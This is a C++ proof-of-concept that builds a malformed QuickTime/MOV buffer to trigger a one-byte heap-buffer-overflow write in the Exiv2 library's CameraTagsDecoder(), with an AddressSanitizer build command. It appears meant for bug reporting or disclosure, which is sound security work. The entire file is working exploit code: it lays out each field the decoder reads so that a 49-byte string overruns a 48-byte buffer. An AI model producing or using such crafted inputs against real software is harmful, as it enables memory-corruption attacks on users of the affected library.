// Proof-of-concept for a 1-byte heap-buffer-overflow write in
// QuickTimeVideo::CameraTagsDecoder() (src/quicktimevideo.cpp).
//
// Reached entirely through the public Exiv2 API:
//   Exiv2::ImageFactory::open(const byte*, size_t)
//   Exiv2::Image::readMetadata()
// with an in-contract (if malformed) QuickTime/MOV byte buffer.
//
// Build:
//   c++ -std=c++17 -fsanitize=address -g -I include probe.cpp -L<build>/lib -lexiv2 -o probe
//
#include <cstdint>
#include <vector>

#include <exiv2/exiv2.hpp>

namespace {

void putU32BE(std::vector<uint8_t>& v, uint32_t x) {
  v.push_back(static_cast<uint8_t>((x >> 24) & 0xff));
  v.push_back(static_cast<uint8_t>((x >> 16) & 0xff));
  v.push_back(static_cast<uint8_t>((x >> 8) & 0xff));
  v.push_back(static_cast<uint8_t>(x & 0xff));
}

void putTag(std::vector<uint8_t>& v, const char tag[4]) {
  v.insert(v.end(), tag, tag + 4);
}

void putFiller(std::vector<uint8_t>& v, size_t n, uint8_t b = 0x41) {
  v.insert(v.end(), n, b);
}

// Builds a minimal QuickTime/MOV byte stream:
//   [ftyp box][udta box -> TAGS box -> Nikon "NIKO" camera-tags payload]
//
// QuickTimeVideo::CameraTagsDecoder() reads the Nikon payload as a fixed
// sequence of fields, ending with a 49-byte "Software" string field read
// into a 48-byte local buffer.
std::vector<uint8_t> buildFile() {
  // ---- ftyp box (16 bytes) ----
  std::vector<uint8_t> ftyp;
  putU32BE(ftyp, 16);
  putTag(ftyp, "ftyp");
  putTag(ftyp, "qt  ");  // major brand recognised by isQTimeType()/fileTypeDecoder()
  putU32BE(ftyp, 0);     // minor version

  // ---- TAGS box content: the CameraTagsDecoder() payload (224 bytes) ----
  // Layout mirrors the exact sequence of reads performed by
  // QuickTimeVideo::CameraTagsDecoder() once it recognises the "NIKO" marker:
  //   Make(24) + Model(14) + ExposureTime(4) + FNumber(4+4) +
  //   ExposureCompensation(4+4) + pad(10) + WhiteBalance(4) +
  //   FocalLength(4+4) + seek(95) + Software(49)
  std::vector<uint8_t> tagsContent;
  putTag(tagsContent, "NIKO");  // first 4 bytes of the 24-byte Make field
  putFiller(tagsContent, 20);   // rest of Make
  putFiller(tagsContent, 14);   // Model
  putFiller(tagsContent, 4);    // ExposureTime
  putFiller(tagsContent, 4);    // FNumber numerator
  putFiller(tagsContent, 4);    // FNumber denominator
  putFiller(tagsContent, 4);    // ExposureCompensation numerator
  putFiller(tagsContent, 4);    // ExposureCompensation denominator
  putFiller(tagsContent, 10);   // unused 10-byte read
  putFiller(tagsContent, 4);    // WhiteBalance
  putFiller(tagsContent, 4);    // FocalLength numerator
  putFiller(tagsContent, 4);    // FocalLength denominator
  putFiller(tagsContent, 95);   // skipped via io_->seek(95, cur)
  putFiller(tagsContent, 49);   // Software: 49 bytes read into a 48-byte buffer

  // ---- TAGS box (8-byte header + content) ----
  std::vector<uint8_t> tagsBox;
  putU32BE(tagsBox, static_cast<uint32_t>(8 + tagsContent.size()));
  putTag(tagsBox, "TAGS");
  tagsBox.insert(tagsBox.end(), tagsContent.begin(), tagsContent.end());

  // ---- udta box (8-byte header + single TAGS child) ----
  std::vector<uint8_t> udta;
  putU32BE(udta, static_cast<uint32_t>(8 + tagsBox.size()));
  putTag(udta, "udta");
  udta.insert(udta.end(), tagsBox.begin(), tagsBox.end());

  std::vector<uint8_t> file;
  file.insert(file.end(), ftyp.begin(), ftyp.end());
  file.insert(file.end(), udta.begin(), udta.end());
  return file;
}

}  // namespace

int main() {
  const std::vector<uint8_t> file = buildFile();

  auto image = Exiv2::ImageFactory::open(file.data(), file.size());
  image->readMetadata();

  return 0;
}
